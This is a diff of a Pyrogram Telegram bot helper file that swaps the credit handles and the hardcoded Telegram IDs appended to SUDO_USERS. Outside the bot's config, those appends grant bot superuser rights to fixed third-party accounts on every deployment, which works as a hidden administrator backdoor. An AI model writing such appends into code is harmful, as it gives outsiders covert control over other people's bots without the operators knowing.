@@ -1,4 +1,4 @@
-# Powered by @HYPER_AD13 | @ShiningOff
+# Powered by @DK_MUSIC_SHAYARI | @Education_quiz_hub
 # Dear Pero ppls Plish Don't remove this line from here🌚
 
 
@@ -8,8 +8,8 @@ from pyrogram.types import Message
 from helpers.admins import get_administrators
 from config import SUDO_USERS
 
-SUDO_USERS.append(5072650671)
-SUDO_USERS.append(5280801259)
+SUDO_USERS.append(1781352356)
+SUDO_USERS.append(1781352356)
 
 def errors(func: Callable) -> Callable:
     async def decorator(client: Client, message: Message):
